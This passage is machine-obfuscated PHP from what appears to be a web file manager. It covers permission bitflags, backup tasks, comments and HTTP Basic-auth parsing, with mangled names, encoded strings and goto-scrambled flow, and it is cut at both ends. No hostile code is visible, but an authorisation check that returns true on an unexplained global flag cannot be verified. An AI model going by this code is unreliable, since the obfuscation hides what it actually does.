LNG($bæîë¨‘ï[2112]), $bæîë¨‘ï[2107] => $bæîë¨‘ï[2113], $bæîë¨‘ï[2109] => 1, $bæîë¨‘ï[2110] => 1, $bæîë¨‘ï[2111] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bæîë¨‘ï[386] => LNG($bæîë¨‘ï[2114]), $bæîë¨‘ï[2107] => $bæîë¨‘ï[2115], $bæîë¨‘ï[2109] => 2, $bæîë¨‘ï[2110] => 1, $bæîë¨‘ï[2111] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bæîë¨‘ï[386] => LNG($bæîë¨‘ï[2116]), $bæîë¨‘ï[2107] => $bæîë¨‘ï[2115], $bæîë¨‘ï[2109] => 3, $bæîë¨‘ï[2110] => 1, $bæîë¨‘ï[2111] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bæîë¨‘ï[386] => LNG($bæîë¨‘ï[2117]), $bæîë¨‘ï[2107] => $bæîë¨‘ï[2118], $bæîë¨‘ï[2109] => 4, $bæîë¨‘ï[2110] => 1, $bæîë¨‘ï[2111] => self::AUTH_SHOW | self::AUTH_VIEW), array($bæîë¨‘ï[386] => LNG($bæîë¨‘ï[2119]), $bæîë¨‘ï[2107] => $bæîë¨‘ï[2120], $bæîë¨‘ï[2109] => 5, $bæîë¨‘ï[2110] => 1, $bæîë¨‘ï[2111] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bæîë¨‘ï[386] => LNG($bæîë¨‘ï[2121]), $bæîë¨‘ï[2107] => $bæîë¨‘ï[2122], $bæîë¨‘ï[2109] => 7, $bæîë¨‘ï[2110] => 1, $bæîë¨‘ï[2111] => 0)); return $cÏª®„Š®†; } public static function authCheck($D®¾Äöô„‰, $CÓ”¾®½ØÕ) { $D®¾Äöô„‰ = intval($D®¾Äöô„‰); if (_get($GLOBALS, $_SERVER[¼€¼ˆ¦‚¡][457])) { return !0; } if ($D®¾Äöô„‰ <= 0) { return !1; } if (($D®¾Äöô„‰ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($D®¾Äöô„‰ & $CÓ”¾®½ØÕ); } public static function authCheckShow($eø‚†õ »Ò) { return self::authCheck($eø‚†õ »Ò, self::AUTH_SHOW); } public static function authCheckView($Eµ¢à˜Ç¾Ë) { return self::authCheck($Eµ¢à˜Ç¾Ë, self::AUTH_VIEW); } public static function authCheckDownload($fÅÍ‘œëõ) { return self::authCheck($fÅÍ‘œëõ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($CøÈ¸Êµƒã) { return self::authCheck($CøÈ¸Êµƒã, self::AUTH_UPLOAD); } public static function authCheckEdit($Fºë÷õ‚ô’) { return self::authCheck($Fºë÷õ‚ô’, self::AUTH_EDIT); } public static function authCheckRemove($eˆ…ƒ‘ˆ“Ò) { return self::authCheck($eˆ…ƒ‘ˆ“Ò, self::AUTH_REMOVE); } public static function authCheckShare($d·„ÖÎ˜•‰) { return self::authCheck($d·„ÖÎ˜•‰, self::AUTH_SHARE); } public static function authCheckComment($fÃíºÌ½Êó) { return self::authCheck($fÃíºÌ½Êó, self::AUTH_COMMENT); } public static function authCheckEvent($dö­‹Ëº‰¢) { return self::authCheck($dö­‹Ëº‰¢, self::AUTH_EVENT); } public static function authCheckRoot($DàË‘èó) { return self::authCheck($DàË‘èó, self::AUTH_ROOT); } public static function authDisable($a¢æÜ¦ñ¾¢, $bÒ‰¤¹ä½”) { if (intval($a¢æÜ¦ñ¾¢) <= 0) { return 0; } return intval($a¢æÜ¦ñ¾¢) & ~$bÒ‰¤¹ä½”; } public $optionType = "\x53\x79\x73\164\x65\x6d\56\163\157\x75\x72\143\x65\x41\165\x74\150\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\141\x75\164\x68", "\x6c\x61\x62\x65\x6c", "\144\x69\x73\x70\154\141\171", "\x73\171\163\x74\145\155", "\x73\x6f\x72\x74"); public function initData() { $bŸÖÖçèÍŸ = $this->authDefault(); foreach ($bŸÖÖçèÍŸ as $fÆŠß°¿) { $this->add($fÆŠß°¿); } } public function listData($cŒØ¿À¬ä¢ = false, $fÎµäôä¯Ô = "\x73\x6f\162\164", $FÎ—ñ´ÛŒù = false) { return parent::listData($cŒØ¿À¬ä¢, $fÎµäôä¯Ô, $FÎ—ñ´ÛŒù); } public function update($b«½ïêâùÌ, $bò„•Íñƒ) { $CÑ‚Ñ½„ğ =& $_SERVER[¼€¼ˆ¦‚¡]; $c¦‡¼¿½Ü = parent::listData($b«½ïêâùÌ); $b•”áœù»ã = $this->findByName($bò„•Íñƒ[$CÑ‚Ñ½„ğ[28]]); if (!$c¦‡¼¿½Ü || $b•”áœù»ã && $b•”áœù»ã[$CÑ‚Ñ½„ğ[367]] != $c¦‡¼¿½Ü[$CÑ‚Ñ½„ğ[367]]) { return !1; } $this->filterAuth($bò„•Íñƒ[$CÑ‚Ñ½„ğ[376]]); return parent::update($b«½ïêâùÌ, $bò„•Íñƒ); } public function remove($a×ÇÁêÒõ±) { $cìÒ‰Ë— = parent::listData($a×ÇÁêÒõ±); if (!$cìÒ‰Ë— || $cìÒ‰Ë—[$_SERVER[¼€¼ˆ¦‚¡][1080]]) { return !1; } return parent::remove($a×ÇÁêÒõ±); } public function add($eŞ¿Ä“ÍÀŒ = array()) { goto CÙÛ¡¯¾•ä; f½¾Ì›»Ì»: return parent::insert($eŞ¿Ä“ÍÀŒ); goto Eñ¦ğâª«; CÙÛ¡¯¾•ä: $d“î•Ÿ„š =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->findByName($eŞ¿Ä“ÍÀŒ[$d“î•Ÿ„š[28]])) { return !1; } $EğÖÉØ¿‹Ã = array($d“î•Ÿ„š[28] => $d“î•Ÿ„š[33], $d“î•Ÿ„š[376] => 1, $d“î•Ÿ„š[2123] => $d“î•Ÿ„š[2124], $d“î•Ÿ„š[2125] => 1, $d“î•Ÿ„š[1080] => 0, $d“î•Ÿ„š[2126] => 0); goto F†ÇƒÁÑ…; F†ÇƒÁÑ…: $eŞ¿Ä“ÍÀŒ = array_merge($EğÖÉØ¿‹Ã, $eŞ¿Ä“ÍÀŒ); $eŞ¿Ä“ÍÀŒ[$d“î•Ÿ„š[2126]] = $this->getSort(); $this->filterAuth($eŞ¿Ä“ÍÀŒ[$d“î•Ÿ„š[376]]); goto f½¾Ì›»Ì»; Eñ¦ğâª«: } private function getSort() { $AòŒÇ¸ŠÒ— =& $_SERVER[¼€¼ˆ¦‚¡]; $bï¦§ŸÕÂÕ = parent::listData(); $eÒ¥‰®ƒõ­ = array_to_keyvalue($bï¦§ŸÕÂÕ, $AòŒÇ¸ŠÒ—[33], $AòŒÇ¸ŠÒ—[2126]); return empty($eÒ¥‰®ƒõ­) ? 0 : max($eÒ¥‰®ƒõ­) + 1; } private function filterAuth(&$bóÈ¾¤šÜ) { goto fÖ¡Ø•‰…­; aë¯¸³ÀÛø: foreach ($aµÀ‚”ÍˆÆ as $F”“Áò‡ùö) { if ($bóÈ¾¤šÜ & $F”“Áò‡ùö) { $A«ºå—ò½©[] = $F”“Áò‡ùö; } } if (in_array(self::AUTH_ROOT, $A«ºå—ò½©)) { $bóÈ¾¤šÜ = array_sum($aµÀ‚”ÍˆÆ); return; } $b™‘Í—äó = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto e¯À¶”ğîÂ; e¯À¶”ğîÂ: foreach ($A«ºå—ò½© as $F”“Áò‡ùö) { if (isset($b™‘Í—äó[$F”“Áò‡ùö])) { $A«ºå—ò½© = array_merge($A«ºå—ò½©, $b™‘Í—äó[$F”“Áò‡ùö]); } } $A«ºå—ò½©[] = self::AUTH_SHOW; $bóÈ¾¤šÜ = array_sum(array_unique($A«ºå—ò½©)); goto B”†®‡¨ë; fÖ¡Ø•‰…­: if (!$bóÈ¾¤šÜ) { return; } $aµÀ‚”ÍˆÆ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $A«ºå—ò½© = array(); goto aë¯¸³ÀÛø; B”†®‡¨ë: } public function sort($e†ªİ°œÁğ, $b÷Ã¢õß‚) { return parent::update($e†ªİ°œÁğ, $b÷Ã¢õß‚); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\142\x61\x63\153\x75\x70\x4c\151\163\164"; public $field = array("\x69\x6f", "\x6e\141\155\145", "\x73\x74\x61\164\x75\163", "\x63\x6f\x6e\x74\x65\x6e\x74", "\x72\x65\163\165\154\164", "\x74\151\155\x65\106\x72\x6f\155", "\164\151\155\x65\124\x6f"); public function config() { goto FÊÁÁ¡Çñ“; FÊÁÁ¡Çñ“: $AŠğÆ¦çÅÑ =& $_SERVER[¼€¼ˆ¦‚¡]; $DƒÏç§ÅÛ = Model($AŠğÆ¦çÅÑ[1088])->get($AŠğÆ¦çÅÑ[710]); $DƒÏç§ÅÛ = json_decode($DƒÏç§ÅÛ, !0); goto eµôóĞ™ã; A¯™äó·µç: Action($AŠğÆ¦çÅÑ[2127])->taskInit(); $AŞÏÀîêò = Model($AŠğÆ¦çÅÑ[2128])->listData(); foreach ($AŞÏÀîêò as $bÎ“¶±Á” ) { if ($bÎ“¶±Á” [$AŠğÆ¦çÅÑ[1080]] == $AŠğÆ¦çÅÑ[83] && $bÎ“¶±Á” [$AŠğÆ¦çÅÑ[1425]] == $AŠğÆ¦çÅÑ[2129]) { $Dø¥âÌ¶è¾ = $bÎ“¶±Á” ; break; } } goto D†´•ÙŒ„­; D†´•ÙŒ„­: if (isset($Dø¥âÌ¶è¾[$AŠğÆ¦çÅÑ[190]])) { $Dø¥âÌ¶è¾[$AŠğÆ¦çÅÑ[190]] = json_decode($Dø¥âÌ¶è¾[$AŠğÆ¦çÅÑ[190]], !0); } if (isset($DƒÏç§ÅÛ[$AŠğÆ¦çÅÑ[190]])) { $Dø¥âÌ¶è¾[$AŠğÆ¦çÅÑ[190]][$AŠğÆ¦çÅÑ[1412]] = $DƒÏç§ÅÛ[$AŠğÆ¦çÅÑ[190]]; unset($DƒÏç§ÅÛ[$AŠğÆ¦çÅÑ[190]]); } return array_merge($Dø¥âÌ¶è¾, $DƒÏç§ÅÛ); goto EÁ†µ¥‰Ä±; eµôóĞ™ã: $DƒÏç§ÅÛ = is_array($DƒÏç§ÅÛ) ? $DƒÏç§ÅÛ : array(); if (!isset($DƒÏç§ÅÛ[$AŠğÆ¦çÅÑ[688]])) { $DƒÏç§ÅÛ[$AŠğÆ¦çÅÑ[688]] = $AŠğÆ¦çÅÑ[468]; } $Dø¥âÌ¶è¾ = array(); goto A¯™äó·µç; EÁ†µ¥‰Ä±: } public function listData($dè†˜Øø² = false, $aÖË»ŒãÉ‡ = "\155\157\x64\151\x66\x79\124\151\155\x65", $Dùª¾®æÏ = false) { return parent::listData($dè†˜Øø², $aÖË»ŒãÉ‡, !0); } public function lastItem() { $e—òÉ½Ì§Š = $this->listData(); return !empty($e—òÉ½Ì§Š[0]) ? $e—òÉ½Ì§Š[0] : null; } public function kill($A‘ƒ´ºØ”) { goto F‰£ï›ç¿; cÓ¸íÎó¿Š: Task::kill($CöùëË¯Ù”[709]); Task::kill($CöùëË¯Ù”[725]); Task::kill($CöùëË¯Ù”[733]); goto eê•ƒŞŸ ; eê•ƒŞŸ : $EÎÔ›Éæõê = $FŠšË¡Š‰[$CöùëË¯Ù”[28]]; $CÇ÷Æ­ù°“ = TEMP_FILES . $CöùëË¯Ù”[706] . $EÎÔ›Éæõê . $CöùëË¯Ù”[8]; IO::remove($CÇ÷Æ­ù°“, !1); goto döÖŸÛ†ò; döÖŸÛ†ò: return $this->remove($A‘ƒ´ºØ”); goto eØ ÎÄùÑ’; F‰£ï›ç¿: $CöùëË¯Ù” =& $_SERVER[¼€¼ˆ¦‚¡]; $FŠšË¡Š‰ = $this->listData($A‘ƒ´ºØ”); if (!$FŠšË¡Š‰ || empty($FŠšË¡Š‰[$CöùëË¯Ù”[28]])) { return !0; } goto cÓ¸íÎó¿Š; eØ ÎÄùÑ’: } public function remove($aÔÜøÙ‹Ú×) { $Cé’èâ× = $this->listData($aÔÜøÙ‹Ú×); if (!$Cé’èâ×) { return !0; } return $this->backupRemove($Cé’èâ×); } private function backupRemove($còŠòõ¾ğ) { $Böˆ…»ñ³Ø =& $_SERVER[¼€¼ˆ¦‚¡]; parent::remove($còŠòõ¾ğ[$Böˆ…»ñ³Ø[367]]); $Då‚ÎÛÉÌ¼ = "\x7b\x69\x6f\x3a{$còŠòõ¾ğ[$Böˆ…»ñ³Ø[687]]}\175\57\144\x61\164\141\x62\141\163\x65\57\142\x61\x63\x6b\x75\160\x5f" . $còŠòõ¾ğ[$Böˆ…»ñ³Ø[28]]; IO::remove($Då‚ÎÛÉÌ¼, !1); return !0; } public function start() { goto F±¡«°èãŸ; cÈ¸ÒÂ‰Îõ: return !0; goto eÅÅ¬ä¬Øì; cª™÷†èÑ: if (!$c‡ÂèÆ—->dbFile()) { return !1; } if ($aßÀö¹¬›–[$BíÒÓ«÷–¤[688]] == $BíÒÓ«÷–¤[468]) { $c‡ÂèÆ—->file(); } Backup::set(array($BíÒÓ«÷–¤[685] => 1, $BíÒÓ«÷–¤[699] => time())); goto cÈ¸ÒÂ‰Îõ; eÉè–é½è: $c‡ÂèÆ— = new Backup(); $c‡ÂèÆ—->keep(); if (!$c‡ÂèÆ—->db()) { return !1; } goto cª™÷†èÑ; bİ÷†øµğƒ: if (!$aßÀö¹¬›– || $aßÀö¹¬›–[$BíÒÓ«÷–¤[1409]] != $BíÒÓ«÷–¤[83]) { return !1; } $D“µŠ·Î…ƒ = $this->process(); foreach ($D“µŠ·Î…ƒ as $AÏ±º¶Íš¯) { if ($AÏ±º¶Íš¯) { return Task::restart($AÏ±º¶Íš¯[$BíÒÓ«÷–¤[367]]); } } goto eÉè–é½è; F±¡«°èãŸ: $BíÒÓ«÷–¤ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($GLOBALS[$BíÒÓ«÷–¤[6]][$BíÒÓ«÷–¤[84]][$BíÒÓ«÷–¤[2130]] != $BíÒÓ«÷–¤[83]) { return !0; } $aßÀö¹¬›– = $this->config(); goto bİ÷†øµğƒ; eÅÅ¬ä¬Øì: } public function process() { $cö¶ç‰÷åÌ =& $_SERVER[¼€¼ˆ¦‚¡]; return array($cö¶ç‰÷åÌ[690] => Task::get($cö¶ç‰÷åÌ[709]), $cö¶ç‰÷åÌ[693] => Task::get($cö¶ç‰÷åÌ[725]), $cö¶ç‰÷åÌ[167] => Task::get($cö¶ç‰÷åÌ[733])); } public function restore() { $B‘º±¸ƒ“Ş =& $_SERVER[¼€¼ˆ¦‚¡]; ActionCall($B‘º±¸ƒ“Ş[2131], !0, 1); ActionCall($B‘º±¸ƒ“Ş[2131], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\x65" => "\x63\x6f\155\155\x65\156\164\137\x6d\145\x74\141", "\155\145\164\x61\x46\x69\145\154\x64" => "\143\157\155\x6d\145\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Eê¦ŠÓÃì¥) { $F¶‡ÑÈ¼áŠ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($Eê¦ŠÓÃì¥[$F¶‡ÑÈ¼áŠ[2132]]) { $BŞïœˆ©®„ = $this->where(array($F¶‡ÑÈ¼áŠ[2133] => $Eê¦ŠÓÃì¥[$F¶‡ÑÈ¼áŠ[2132]]))->find(); if (!$BŞïœˆ©®„ || $BŞïœˆ©®„[$F¶‡ÑÈ¼áŠ[371]] != $Eê¦ŠÓÃì¥[$F¶‡ÑÈ¼áŠ[371]] || $BŞïœˆ©®„[$F¶‡ÑÈ¼áŠ[456]] != $Eê¦ŠÓÃì¥[$F¶‡ÑÈ¼áŠ[456]]) { return !1; } $this->where(array($F¶‡ÑÈ¼áŠ[2133] => $Eê¦ŠÓÃì¥[$F¶‡ÑÈ¼áŠ[2132]]))->setAdd($F¶‡ÑÈ¼áŠ[2134], 1); } return $this->add($Eê¦ŠÓÃì¥); } public function remove($c·ß¬óïËœ) { $a©›Û¶ÌÔæ =& $_SERVER[¼€¼ˆ¦‚¡]; $DÉ¶ŒâŒÜ = array($a©›Û¶ÌÔæ[2133] => $c·ß¬óïËœ); $fäÆÖ¦ª¾¼ = $this->where($DÉ¶ŒâŒÜ)->find(); if ($fäÆÖ¦ª¾¼[$a©›Û¶ÌÔæ[2132]]) { $this->where(array($a©›Û¶ÌÔæ[2133] => $fäÆÖ¦ª¾¼[$a©›Û¶ÌÔæ[2132]]))->setAdd($a©›Û¶ÌÔæ[2134], -1); } return $this->where($DÉ¶ŒâŒÜ)->delete(); } public function edit($C‚¸«„¯º‡, $C§º¤çğñŒ) { $eøÁçÕÙç÷ =& $_SERVER[¼€¼ˆ¦‚¡]; $C²äğ‹‚½µ = array($eøÁçÕÙç÷[2133] => $C‚¸«„¯º‡); return $this->where($C²äğ‹‚½µ)->save(array($eøÁçÕÙç÷[2135] => $C§º¤çğñŒ)); } public function prasise($ešùÀªè¤´) { $bïåØÁŒßÂ =& $_SERVER[¼€¼ˆ¦‚¡]; $d„è‘Â—ªí = Model($bïåØÁŒßÂ[2136]); $EÄÕÚ¶«À³ = array($bïåØÁŒßÂ[2133] => $ešùÀªè¤´, $bïåØÁŒßÂ[1428] => USER_ID); $A¤¹®Şë£î = $d„è‘Â—ªí->where($EÄÕÚ¶«À³)->find(); if (!$A¤¹®Şë£î) { $d„è‘Â—ªí->add($EÄÕÚ¶«À³); $FÓµ÷ŠÅã = $this->where(array($bïåØÁŒßÂ[2133] => $ešùÀªè¤´))->setAdd($bïåØÁŒßÂ[2137], 1); } else { $d„è‘Â—ªí->where($EÄÕÚ¶«À³)->delete(); $FÓµ÷ŠÅã = $this->where(array($bïåØÁŒßÂ[2133] => $ešùÀªè¤´))->setAdd($bïåØÁŒßÂ[2137], -1); } return $FÓµ÷ŠÅã; } public function targetInfo($FœÇ„Ú“ï„, $AÀß›ËÑš) { goto FŒ¤º»İ³; a»ª°¥ßóƒ: $B’ÈâİÅ…¼ = "\122\111\x47\110\124\x20\112\117\x49\116\40{$this->tablePrefix}\x63\x6f\x6d\x6d\x65\156\x74\137\160\x72\x61\x69\163\x65\x20\x73\164\x61\x72\x20\x6f\x6e\40\143\157\155\155\x65\156\x74\56\143\157\155\x6d\145\x6e\x74\x49\x44\x20\x3d\40\163\164\x61\x72\56\143\x6f\x6d\x6d\145\x6e\164\x49\104"; $bšØ¾³Æ‚‡ = $this->alias($FÏÀô‚”¶[341])->where($AíÉˆ¶ƒ¹ª)->join($B’ÈâİÅ…¼, $FÏÀô‚”¶[2138])->count(); $Bå×›áÛÁ‚ = array($FÏÀô‚”¶[2139] => $E¾Ê÷™µä, $FÏÀô‚”¶[2140] => $bšØ¾³Æ‚‡); goto cšÙ¨ï‚ô; FŒ¤º»İ³: $FÏÀô‚”¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $AíÉˆ¶ƒ¹ª = array($FÏÀô‚”¶[521] => $FœÇ„Ú“ï„, $FÏÀô‚”¶[522] => $AÀß›ËÑš); $E¾Ê÷™µä = $this->where($AíÉˆ¶ƒ¹ª)->count(); goto a»ª°¥ßóƒ; cšÙ¨ï‚ô: return $Bå×›áÛÁ‚; goto dÏ‡ìô¬ß®; dÏ‡ìô¬ß®: } public function listData($cøâŒùáå°) { $D¦•Î˜ò¬í =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($cøâŒùáå°[$D¦•Î˜ò¬í[2141]])) { if ($cøâŒùáå°[$D¦•Î˜ò¬í[2141]]) { $cøâŒùáå°[$D¦•Î˜ò¬í[2142]] = array($D¦•Î˜ò¬í[927], intval($cøâŒùáå°[$D¦•Î˜ò¬í[2141]])); } unset($cøâŒùáå°[$D¦•Î˜ò¬í[2141]]); } if (isset($cøâŒùáå°[$D¦•Î˜ò¬í[2143]])) { if ($cøâŒùáå°[$D¦•Î˜ò¬í[2143]]) { $cøâŒùáå°[$D¦•Î˜ò¬í[2142]] = array($D¦•Î˜ò¬í[924], intval($cøâŒùáå°[$D¦•Î˜ò¬í[2143]])); } unset($cøâŒùáå°[$D¦•Î˜ò¬í[2143]]); } return $this->_listData($cøâŒùáå°); } private function _listData($F‡Ç¯«Æ¤Œ) { $d·Üì‰Œ¾Í =& $_SERVER[¼€¼ˆ¦‚¡]; $dõáõâÇ„² = $this->where($F‡Ç¯«Æ¤Œ)->_makeOrder()->selectPage(100); $this->_listAppendParent($dõáõâÇ„²[$d·Üì‰Œ¾Í[354]]); $this->_listAppendUser($dõáõâÇ„²[$d·Üì‰Œ¾Í[354]]); $this->_listAppendMeta($dõáõâÇ„²[$d·Üì‰Œ¾Í[354]]); return $dõáõâÇ„²; } private function _makeOrder() { $Dè¨«ù¹÷ï =& $_SERVER[¼€¼ˆ¦‚¡]; $bß÷„£¿È° = array($Dè¨«ù¹÷ï[2137], $Dè¨«ù¹÷ï[2134], $Dè¨«ù¹÷ï[187]); $E–êİ‰÷Ó— = Input::get($Dè¨«ù¹÷ï[407], $Dè¨«ù¹÷ï[7], $Dè¨«ù¹÷ï[389], $bß÷„£¿È°); $Dåœ¿ÂŒá‰ = Input::get($Dè¨«ù¹÷ï[408], $Dè¨«ù¹÷ï[7], $Dè¨«ù¹÷ï[1430], array($Dè¨«ù¹÷ï[2144], $Dè¨«ù¹÷ï[405])); $Eß›¦†ßÏª = $E–êİ‰÷Ó— . $Dè¨«ù¹÷ï[50] . $Dåœ¿ÂŒá‰; return $this->order($Eß›¦†ßÏª); } private function _listAppendParent(&$DĞ”¿ ÔÆŠ) { goto eí±·—åÕË; eí±·—åÕË: $FĞ¬ã¯É‹¥ =& $_SERVER[¼€¼ˆ¦‚¡]; $D¯¨„¡ï¶‡ = array_unique(array_to_keyvalue($DĞ”¿ ÔÆŠ, $FĞ¬ã¯É‹¥[33], $FĞ¬ã¯É‹¥[2132])); $D¯¨„¡ï¶‡ = array_remove_value($D¯¨„¡ï¶‡, $FĞ¬ã¯É‹¥[468]); goto b‰Şäâ™ä; E„°‚÷¤à÷: foreach ($DĞ”¿ ÔÆŠ as &$AÎÙ§Š—ó¾) { if (isset($b’µ¤À©¡[$AÎÙ§Š—ó¾[$FĞ¬ã¯É‹¥[2132]]])) { $AÎÙ§Š—ó¾[$FĞ¬ã¯É‹¥[2145]] = $b’µ¤À©¡[$AÎÙ§Š—ó¾[$FĞ¬ã¯É‹¥[2132]]]; } } goto b‚³Ä‚ÄËë; b‰Şäâ™ä: if (!$D¯¨„¡ï¶‡) { return; } $b’µ¤À©¡ = $this->where(array($FĞ¬ã¯É‹¥[2133] => array($FĞ¬ã¯É‹¥[7], $D¯¨„¡ï¶‡)))->select(); $b’µ¤À©¡ = array_to_keyvalue($b’µ¤À©¡, $FĞ¬ã¯É‹¥[2142]); goto E„°‚÷¤à÷; b‚³Ä‚ÄËë: } private function _listAppendUser(&$föÓŠá‰‹) { goto cˆƒï­…Ç; cˆƒï­…Ç: $eÄ¯¿ŸÁ†ç =& $_SERVER[¼€¼ˆ¦‚¡]; $d”ãÄ¸ôÙ¿ = array_unique(array_to_keyvalue($föÓŠá‰‹, $eÄ¯¿ŸÁ†ç[33], $eÄ¯¿ŸÁ†ç[1437])); $d”ãÄ¸ôÙ¿ = array_remove_value($d”ãÄ¸ôÙ¿, $eÄ¯¿ŸÁ†ç[468]); goto eÈìÙƒ‡­®; eÈìÙƒ‡­®: if (count($d”ãÄ¸ôÙ¿) == 0) { return; } foreach ($föÓŠá‰‹ as $E´‡ê½àÛ¾) { if (isset($E´‡ê½àÛ¾[$eÄ¯¿ŸÁ†ç[2145]])) { $d”ãÄ¸ôÙ¿[] = $E´‡ê½àÛ¾[$eÄ¯¿ŸÁ†ç[2145]][$eÄ¯¿ŸÁ†ç[1437]]; } } $EòÍÓØ‰¾Ã = Model($eÄ¯¿ŸÁ†ç[477])->userListInfo($d”ãÄ¸ôÙ¿); goto d‘Šéâïî; d‘Šéâïî: foreach ($föÓŠá‰‹ as &$E´‡ê½àÛ¾) { $E´‡ê½àÛ¾[$eÄ¯¿ŸÁ†ç[535]] = $EòÍÓØ‰¾Ã[$E´‡ê½àÛ¾[$eÄ¯¿ŸÁ†ç[1437]]]; if (isset($E´‡ê½àÛ¾[$eÄ¯¿ŸÁ†ç[2145]])) { $E´‡ê½àÛ¾[$eÄ¯¿ŸÁ†ç[2145]][$eÄ¯¿ŸÁ†ç[535]] = $EòÍÓØ‰¾Ã[$E´‡ê½àÛ¾[$eÄ¯¿ŸÁ†ç[2145]][$eÄ¯¿ŸÁ†ç[1437]]]; } } goto dí³Æ»Ü; dí³Æ»Ü: } private function _listAppendMeta(&$E Ü”æ´) { goto A®ª²Êå¼Ü; cÈ “ƒ±: if (!$f´÷ƒ›Àñ) { return !1; } foreach ($E Ü”æ´ as &$D×Ş÷±—èè) { $D×Ş÷±—èè[$eöÖ” ©‰ê[417]] = $f´÷ƒ›Àñ[$D×Ş÷±—èè[$eöÖ” ©‰ê[2142]]]; if (isset($D×Ş÷±—èè[$eöÖ” ©‰ê[2145]])) { $D×Ş÷±—èè[$eöÖ” ©‰ê[2145]][$eöÖ” ©‰ê[417]] = $f´÷ƒ›Àñ[$D×Ş÷±—èè[$eöÖ” ©‰ê[2145]][$eöÖ” ©‰ê[2142]]]; } } goto fÆÂØƒËè›; A®ª²Êå¼Ü: $eöÖ” ©‰ê =& $_SERVER[¼€¼ˆ¦‚¡]; $d®¹˜Ô¼ç = array_unique(array_to_keyvalue($E Ü”æ´, $eöÖ” ©‰ê[33], $eöÖ” ©‰ê[2142])); $d®¹˜Ô¼ç = array_remove_value($d®¹˜Ô¼ç, $eöÖ” ©‰ê[468]); goto B¿©É§Õ ; B¿©É§Õ : if (!$d®¹˜Ô¼ç) { return; } foreach ($E Ü”æ´ as $D×Ş÷±—èè) { if (isset($D×Ş÷±—èè[$eöÖ” ©‰ê[2145]])) { $d®¹˜Ô¼ç[] = $D×Ş÷±—èè[$eöÖ” ©‰ê[2145]][$eöÖ” ©‰ê[2142]]; } } $f´÷ƒ›Àñ = $this->metaList($d®¹˜Ô¼ç); goto cÈ “ƒ±; fÆÂØƒËè›: } private function metaList($d¯‡Ò¾æ¦È) { goto DÒŞÜãÜˆ; DÒŞÜãÜˆ: $fìõÃ˜…‘˜ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$d¯‡Ò¾æ¦È) { return array(); } $C×²¢’ÒçØ = array($fìõÃ˜…‘˜[2142] => array($fìõÃ˜…‘˜[7], $d¯‡Ò¾æ¦È)); goto aË£¯×®ÆÚ; AÓ…œô±¾: return $dÛôŒ‘¡„¤ ? $dÛôŒ‘¡„¤ : array(); goto C¶„¥×°Æœ; aË£¯×®ÆÚ: $dÛôŒ‘¡„¤ = Model($fìõÃ˜…‘˜[2146])->where($C×²¢’ÒçØ)->select(); $dÛôŒ‘¡„¤ = array_to_keyvalue_group($dÛôŒ‘¡„¤, $fìõÃ˜…‘˜[2142]); foreach ($dÛôŒ‘¡„¤ as $eÂßğîØ§¸ => $A±›ù‹ºå™) { $B ´­¾Ôƒ½ = array(); foreach ($A±›ù‹ºå™ as $BÑÌä×¬ßò) { $B ´­¾Ôƒ½[$BÑÌä×¬ßò[$fìõÃ˜…‘˜[89]]] = $BÑÌä×¬ßò[$fìõÃ˜…‘˜[359]]; } $dÛôŒ‘¡„¤[$eÂßğîØ§¸] = $B ´­¾Ôƒ½; } goto AÓ…œô±¾; C¶„¥×°Æœ: } } goto E˜ˆãØÛÕ; DµÑŸºã„: class HttpAuth { public static function get() { $B¾¶³„ =& $_SERVER[¼€¼ˆ¦‚¡]; $EÍøˆä¼âä = $B¾¶³„[33]; $D•·ÂìÂƒ› = $B¾¶³„[33]; if (isset($_SERVER[$B¾¶³„[1760]])) { $EÍøˆä¼âä = $_SERVER[$B¾¶³„[1760]]; $D•·ÂìÂƒ› = $_SERVER[$B¾¶³„[1761]]; } elseif (isset($_SERVER[$B¾¶³„[1762]])) { $B”éİĞ¦­… = $_SERVER[$B¾¶³„[1762]]; if (strpos(strtolower($B”éİĞ¦­…), $B¾¶³„[1763]) === 0) { $FƒåÅä×¼ = explode($B¾¶³„[4], base64_decode(substr($B”éİĞ¦­…, 6))); $EÍøˆä¼âä = isset($FƒåÅä×¼[0]) ? $FƒåÅä×¼[0] : $B¾¶³„[33]; $D•·ÂìÂƒ› = isset($FƒåÅä×¼[1]) ? $FƒåÅä×¼[1] : 0; } } return array($B¾¶³„[535] => $EÍøˆä¼âä, $B¾¶³„[896] => $D•·ÂìÂƒ›); } public static function error() { goto 